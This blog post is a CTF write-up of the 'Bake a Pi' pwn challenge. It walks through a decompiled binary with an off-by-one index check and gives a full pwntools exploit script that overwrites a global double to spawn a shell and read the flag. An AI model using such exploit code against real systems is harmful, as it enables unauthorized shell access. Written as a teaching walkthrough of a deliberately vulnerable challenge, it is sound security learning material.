---
layout: post
title:  "Bake a Pi"
date:   2026-04-06 18:25:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /RITSECCTF-2026-bake-a-pi/
---

**Category**: pwn

**Description**: Are you good at baking? I'm trying to create the perfect pi recipe, but can't quite get it right. Can you help me? This challenge was sponsored by SkillBit.                                                              `nc bake-a-pi.ctf.ritsec.club 1555`

I get the challenge file:
```shell
file pi.bin  
pi.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=377d166cd0bc2d843de12c8f8658437bbc1b3d70, for GNU/Linux 3.2.0, not stripped
```

Running the binary:
```shell
./pi.bin  
I want to create the perfect pi recipe, but can't quite get it right...  
Can you help me bake the perfect pi?  
  
------------------------------------------------------------  
(S)how recipe, (C)change ingredient, (T)aste test: S  
0. 1 large pi crust  
1. 7 apples, sliced  
2. 1/2 cup granulated sugar  
3. 2 tbs flour  
4. 1 tsp ground cinnamon  
5. 1/8 tsp ground nutmeg  
6. 1 tbs lemon juice  
7. 1 large egg  
------------------------------------------------------------  
(S)how recipe, (C)change ingredient, (T)aste test: C  
Which ingredient would you like to change?: 0  
Enter ingredient: AAAAAAAAA  
------------------------------------------------------------  
(S)how recipe, (C)change ingredient, (T)aste test: T  
Still doesn't taste right. Let's try a different recipe.  
------------------------------------------------------------  
(S)how recipe, (C)change ingredient, (T)aste test: ^C
```

Connecting to the server:
```shell
nc bake-a-pi.ctf.ritsec.club 1555  
I want to create the perfect pi recipe, but can't quite get it right...  
Can you help me bake the perfect pi?  
  
------------------------------------------------------------  
(S)how recipe, (C)change ingredient, (T)aste test:
```

I put the binary in ghidra. `main()`:
```shell
void main(void)

{
  uint uVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char local_29;
  uint local_28;
  uint local_24;
  undefined8 local_20;
  
  local_20 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  puts("I want to create the perfect pi recipe, but can\'t quite get it right...");
  puts("Can you help me bake the perfect pi?");
  putchar(10);
  do {
    while( true ) {
      while( true ) {
        puts("------------------------------------------------------------");
        printf("(S)how recipe, (C)change ingredient, (T)aste test: ");
        __isoc99_scanf("%c%*c",&local_29);
        if (local_29 != 'T') break;
        if (pi == 3.141592653589793) {
          puts("Yummy! This is the perfect pi!");
          execl("/bin/bash","/bin/bash",0);
        }
        else {
          puts("Still doesn\'t taste right. Let\'s try a different recipe.");
        }
      }
      if (local_29 < 'U') break;
LAB_0040140e:
      printf("Unknown option \'%c\'\n",(ulong)(uint)(int)local_29);
    }
    if (local_29 == 'C') {
      printf("Which ingredient would you like to change?: ");
      __isoc99_scanf("%u%*c",&local_28);
      if (local_28 < 9) {
        printf("Enter ingredient: ");
        fgets(ingredients + (ulong)local_28 * 0x20,0x20,stdin);
        uVar1 = local_28;
        sVar2 = strlen(ingredients + (ulong)local_28 * 0x20);
        *(undefined *)((ulong)uVar1 * 0x20 + sVar2 + 0x40407f) = 0;
      }
      else {
        puts("The recipe doesn\'t have that many ingredients");
      }
    }
    else {
      if (local_29 != 'S') goto LAB_0040140e;
      for (local_24 = 0; local_24 < 8; local_24 = local_24 + 1) {
        printf("%d. %s\n",(ulong)local_24,ingredients + (ulong)local_24 * 0x20);
      }
    }
  } while( true );
}
```

If the global variable `pi` equals exactly `3.141592653589793` the program calls `execl("/bin/bash","/bin/bash",0);` and spawns a shell.

`if (local_28 < 9)` allows writing to ingredient index `8`. The memory is layed out like this:
```shell
ingredients[0]  (0x20 bytes)
ingredients[1]  (0x20 bytes)
ingredients[2]  (0x20 bytes)
ingredients[3]  (0x20 bytes)
ingredients[4]  (0x20 bytes)
ingredients[5]  (0x20 bytes)
ingredients[6]  (0x20 bytes)
ingredients[7]  (0x20 bytes)
ingredients[8]  (overlaps with pi)
pi              (double)
```

We need the IEEE754 double representation of: `3.141592653589793`

In hex: `0x400921fb54442d18`

Solve script:
```python
from pwn import *

r = remote("bake-a-pi.ctf.ritsec.club",1555)

r.sendlineafter(b": ", b"C")
r.sendlineafter(b"change?: ", b"8")

payload = p64(0x400921fb54442d18)

r.sendlineafter(b"ingredient: ", payload)

r.sendlineafter(b": ", b"T")

r.interactive()
```

Output:
```shell
python3 solve2.py  
[+] Opening connection to bake-a-pi.ctf.ritsec.club on port 1555: Done  
[*] Switching to interactive mode  
Yummy! This is the perfect pi! 
$ ls  
flag.txt  
run  
$ cat flag.txt  
RS{0ff_by_0n3_4s_e4sy_4s_4_sk1llb17_p1}  
$  
[*] Interrupted  
[*] Closed connection to bake-a-pi.ctf.ritsec.club port 1555
```

`RS{0ff_by_0n3_4s_e4sy_4s_4_sk1llb17_p1}`
